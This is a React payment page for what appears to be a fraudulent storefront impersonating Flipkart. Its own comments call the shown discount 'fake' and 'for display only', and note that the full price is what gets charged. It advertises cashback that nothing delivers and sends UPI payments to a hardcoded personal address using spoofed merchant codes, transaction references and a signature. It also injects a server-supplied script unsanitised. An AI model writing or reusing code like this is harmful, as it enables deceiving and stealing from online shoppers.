import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { localService } from "../services/localService";

const Payment = () => {
  const navigate = useNavigate();
  const [product, setProduct] = useState(null);
  const [selectedMethod, setSelectedMethod] = useState("");
  const [settings, setSettings] = useState({
    show_gpay: false,
    show_phonepe: false,
    show_paytm: false,
    upi: "",
    pay_type: false,
    payment_script: "",
  });

  useEffect(() => {
    const savedProduct = localStorage.getItem("selected_verient");
    if (savedProduct) {
      setProduct(JSON.parse(savedProduct));
    }

    // Fetch settings from API
    const fetchSettings = async () => {
      try {
        const response = await localService.getSettings();
        if (response.success) {
          setSettings(response.data);
          // Set initial selected method based on availability
          const data = response.data;
          console.log("Settings data:", data);
          if (data.show_phonepe) {
            setSelectedMethod("phonepe");
          } else if (data.show_gpay) {
            setSelectedMethod("gpay");
          } else if (data.show_paytm) {
            setSelectedMethod("paytm");
          }
        }
      } catch (error) {
        console.error("Error fetching settings:", error);
      }
    };
    fetchSettings();
  }, []);

  if (!product) {
    return (
      <div className="flex justify-center items-center h-screen">
        Loading...
      </div>
    );
  }

  const sellingPrice = parseFloat(product.selling_price);

  // Fake Discount Logic: 15% off for display only
  // PhonePe: Price - 15%
  // GPay: Price - 15% (User prompt said 20% but code showed same var 'fiftyPercent' used? Use 15% to be safe or 20% if user insists on text "20% Discount")
  // Actually manage_payment.js calculated 15% for both.
  const displayDiscountPercent = 0.15;
  const discountAmount = sellingPrice * displayDiscountPercent;
  const displayPrice = Math.round(sellingPrice - discountAmount);

  // Cashback Logic: selling_price - 40% (which means 60% of selling price is the "Cashback Price"?)
  // manage_payment.js: totals_price = sellingPrice - (sellingPrice * 0.40)
  const cashbackPrice = Math.round(sellingPrice - sellingPrice * 0.4);

  const handlePayment = () => {
    if (!product) return;

    const orderNumber = Math.floor(Math.random() * 10000000000);
    const upi_address = settings.upi || "fsv.470000099388045@icici";
    const site_name = "Verified Seller";
    // Important: The actual amount charged is the original selling price
    const amt = parseFloat(product.selling_price).toFixed(2);
    let redirect_url = "";

    switch (selectedMethod) {
      case "gpay":
        // Legacy 'gpay' case often redirected to phonepe or specific tez link.
        // Using the robust params found in legacy:
        redirect_url = `tez://upi/pay?pa=${upi_address}&pn=${encodeURIComponent("Online Store")}&tn=Order_Id_${orderNumber}&am=${amt}&tr=H2MkMGf5olejI&mc=8931&cu=INR`;
        break;
      case "phonepe":
        // Legacy PhonePe Params: tr=RZPPXTog5fXlvIb6Wqrv2, mc=4215, mode=19
        redirect_url = `phonepe://pay?ver=01&mode=19&pa=${upi_address}&pn=${encodeURIComponent(site_name)}&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_${orderNumber}&am=${amt}`;
        break;
      case "paytm":
        // Legacy Paytm Params
        redirect_url = `paytmmp://cash_wallet?pa=${upi_address}&pn=${encodeURIComponent("Online Shopping")}&am=${amt}&tr=RZPPYDwIIDfuh4iCnqrv2&mc=5732&cu=INR&tn=Online_Shoping&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer`;
        break;
      case "bhim_upi":
        redirect_url = `bhim://pay?pa=${upi_address}&pn=${encodeURIComponent("Online Store")}&tn=Order_Id_${orderNumber}&am=${amt}&tr=H2MkMGf5olejI&mc=8931&cu=INR`;
        break;
      default:
        redirect_url = `whatsapp://pay?pa=${upi_address}&pn=${encodeURIComponent("Online Store")}&tn=Order_Id_${orderNumber}&am=${amt}&tr=H2MkMGf5olejI&mc=8931&cu=INR`;
        break;
    }

    if (redirect_url) {
      window.location.href = redirect_url;
    }
  };

  return (
    <div className="bg-white min-h-screen">
      {/* Header */}
      <div className="container mx-auto min-w-full p-3 pb-0 bg-white sticky top-0 z-50 shadow-sm">
        <div className="flex items-center justify-between">
          <div className="flex items-center mb-4.5 w-full">
            <div className="w-[10%]" onClick={() => navigate(-1)}>
              <div className="">
                <img
                  src="/assets/images/theme/back_dark.svg"
                  alt="Back"
                  className="w-5 h-5"
                />
              </div>
            </div>
            <div className="">
              <p className="text-[13px] text-gray-500 mb-0 leading-none">
                Step 3 of 3
              </p>
              <h5 className="text-[16px] font-semibold text-gray-800 mt-1 mb-0 leading-tight">
                Payments
              </h5>
            </div>
            <div className="flex items-center px-2 md:px-4 justify-center bg-[#f5f5f5] rounded py-1 ml-auto">
              <img
                src="/assets/images/lock-icon.svg"
                alt="Secure"
                className="w-4 h-4"
              />
              <p className="mb-0 ml-1 text-[10px] md:text-[12px] font-bold text-gray-600 whitespace-nowrap">
                100% Secure
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="bg-white md:mb-15">
        {/* Payment Methods Section */}
        {settings.pay_type ? (
          <div className="m-4 p-4 bg-white rounded-lg shadow-sm border border-gray-100">
            <div
              dangerouslySetInnerHTML={{ __html: settings.payment_script }}
            />
          </div>
        ) : (
          <div className="bg-[#f5f5f5] rounded-lg overflow-hidden">
            <div className="p-4 border-b border-gray-100 flex justify-between items-center bg-[#F5F5F5] rounded-t-lg">
              <div className="flex items-center">
                <img
                  src="/assets/images/upi.svg"
                  alt="UPI"
                  className="w-[30px]"
                />
                <p className="text-[15px] font-medium ml-2 text-gray-700">
                  UPI
                </p>
              </div>
              <img
                src="/assets/images/up_arw.png"
                alt="Arrow"
                className="w-[18px]"
              />
            </div>

            <div className="p-2 mb-0.5 shadow-[0px_2px_5px_rgba(0,0,0,0.1)] m-2 bg-white rounded">
              {/* PhonePe */}
              {settings.show_phonepe == 1 && (
                <div
                  className={`flex items-center justify-between p-3 mb-2 cursor-pointer ${
                    selectedMethod === "phonepe" ? "active" : ""
                  }`}
                  onClick={() => setSelectedMethod("phonepe")}
                >
                  <div className="flex items-center">
                    <input
                      type="radio"
                      name="upi"
                      checked={selectedMethod === "phonepe"}
                      onChange={() => setSelectedMethod("phonepe")}
                      className="w-5 h-5 mr-3 accent-blue-600"
                    />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span className="">₹{displayPrice}</span>
                        <span className=" text-gray-400 font-light">|</span>
                        <span>PhonePe</span>
                      </div>
                      <p className="text-[14px] text-[#875BB7] mt-0.5">
                        20% Extra Discount By PhonePe
                      </p>
                    </div>
                  </div>
                  <img
                    src="/assets/images/phonepe.svg"
                    alt="PhonePe"
                    className="w-[30px]"
                  />
                </div>
              )}

              {/* GPay */}
              {settings.show_gpay == 1 && (
                <div
                  className={`flex items-center justify-between p-3 mb-2 cursor-pointer ${
                    selectedMethod === "gpay" ? "active" : ""
                  }`}
                  onClick={() => setSelectedMethod("gpay")}
                >
                  <div className="flex items-center">
                    <input
                      type="radio"
                      name="upi"
                      checked={selectedMethod === "gpay"}
                      onChange={() => setSelectedMethod("gpay")}
                      className="w-5 h-5 mr-3 accent-blue-600"
                    />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span>₹{displayPrice}</span>
                        <span className="text-gray-400 font-light">|</span>
                        <span>GPay</span>
                        <span className="text-gray-400 font-light">|</span>
                        {/* <span className="text-[#ff4700]">Save ₹50</span> */}
                      </div>
                      <p className="text-[14px] text-[#34A853] mt-0.5">
                        20% Extra Discount By Gpay
                      </p>
                    </div>
                  </div>
                  <img
                    src="/assets/images/gpay_icon.svg"
                    alt="GPay"
                    className="w-[30px]"
                  />
                </div>
              )}

              {/* Paytm */}
              {settings.show_paytm == 1 && (
                <div
                  className={`flex items-center justify-between p-3 border-t border-gray-200 cursor-pointer ${
                    selectedMethod === "paytm" ? "active" : ""
                  }`}
                  onClick={() => setSelectedMethod("paytm")}
                >
                  <div className="flex items-center">
                    <input
                      type="radio"
                      name="upi"
                      checked={selectedMethod === "paytm"}
                      onChange={() => setSelectedMethod("paytm")}
                      className="w-5 h-5 mr-3 accent-blue-600"
                    />
                    <div>
                      <div className="flex gap-2 font-bold text-[15px] items-center text-gray-800">
                        <span>₹{displayPrice}</span>
                        <span className="text-gray-400 font-light">|</span>
                        <span>PayTM</span>
                      </div>
                      <p className="text-[14px] text-[#02B9EF] mt-0.5">
                        15% Extra Discount By Paytm
                      </p>
                    </div>
                  </div>
                  <img
                    src="/assets/images/paytm_icon.svg"
                    alt="Paytm"
                    className="w-[30px]"
                  />
                </div>
              )}
            </div>
          </div>
        )}

        {/* Cashback Banner */}
        <div className="bg-[#E7F9ED] rounded-lg p-4 mb-4 text-center m-4 font-medium">
          <div className="flex items-center justify-start mb-2">
            <p className="text-[20px] font-bold text-[#008C00] pb-2 leading-tight">
              {/* <span className="animate-pulse">₹{cashbackPrice}</span>{" "} */}
              Cashback on First Order!
            </p>
          </div>
          <div className="text-[14px] text-justify leading-snug -mt-3 w-full max-w-md">
            Place your order on this Flipkart product and get{" "}
            <span className="font-bold text-gray-900">₹{cashbackPrice}</span>{" "}
            cashback! Cashback will be credited to your original UPI payment
            method (QR/PhonePe/Paytm/Gpay) after your order is delivered to you.
          </div>
        </div>

        {/* Price Breakdown */}
        <div className="bg-[#F1F5FF] rounded-lg p-3 mb-0 font-medium m-4">
          <div className="flex justify-between py-1 text-[15px]">
            <span>Price (1 item)</span>
            <span>₹ {sellingPrice}</span>
          </div>
          <div className="flex justify-between py-1 text-[15px]">
            <span>Delivery Charges</span>
            <span className="text-[#008C00]">FREE</span>
          </div>
          <div className="flex justify-between py-1 text-[15px]">
            <span>Discount fee</span>
            <span className="line-through text-gray-500">₹ {product.mrp}</span>
          </div>
          <div className="flex justify-between py-3 mt-1 border-t border-dashed border-[#c4c4c4] items-center">
            <div className="flex items-center text-[#2855E9] text-[15px]">
              Total Amount
              <img
                src="/assets/images/uparrow.png"
                alt="Arrow"
                className="w-[10px] h-[10px] ml-2 mt-1"
              />
            </div>
            <span className="text-[16px] font-bold text-[#2855E9]">
              ₹{" "}
              {
                sellingPrice /* Using sellingPrice as per legacy screenshot visual, despite php weirdness */
              }
            </span>
          </div>
        </div>

        {/* Secure Pay Image */}
        <div className="flex justify-start">
          <img
            src="/assets/images/SecurePay.jpg"
            alt="Secure Pay"
            className="w-full lg:h-100 max-w-sm mb-5 md:mb-25 lg:mb-0 lg:min-w-255"
          />
        </div>
      </div>

      {/* Footer */}
      {/* Mobile Footer (Exact match to image) */}
      <div className="w-full bg-white shadow-[0_-1px_5px_rgba(0,0,0,0.1)] p-4 px-6 flex md:hidden z-50 justify-between items-center border-t border-gray-100">
        <div className="flex items-center">
          <span className="text-[24px] font-medium text-[#212121]">
            ₹{sellingPrice}
          </span>
        </div>
        <button
          className="bg-[#FFC107] text-black font-bold py-3 px-8 rounded-lg shadow-sm uppercase text-[15px] cursor-pointer border-none"
          onClick={handlePayment}
        >
          PROCEED TO PAY
        </button>
      </div>

      {/* Desktop Footer (Original) */}
      <div className="hidden md:flex fixed bottom-0 w-full bg-white shadow-[0_-2px_10px_rgba(0,0,0,0.1)] p-3 z-50 justify-between items-center mx-auto left-0 right-0">
        <div className="w-[50%] px-2">
          <span className="text-[18px] block leading-none">
            ₹{sellingPrice}
          </span>
        </div>
        <button
          className="w-[50%] bg-[#FFC107] text-black font-semibold py-3 border-none rounded-sm shadow-sm uppercase text-[14px] cursor-pointer"
          onClick={handlePayment}
        >
          Proceed To Pay
        </button>
      </div>
    </div>
  );
};

export default Payment;
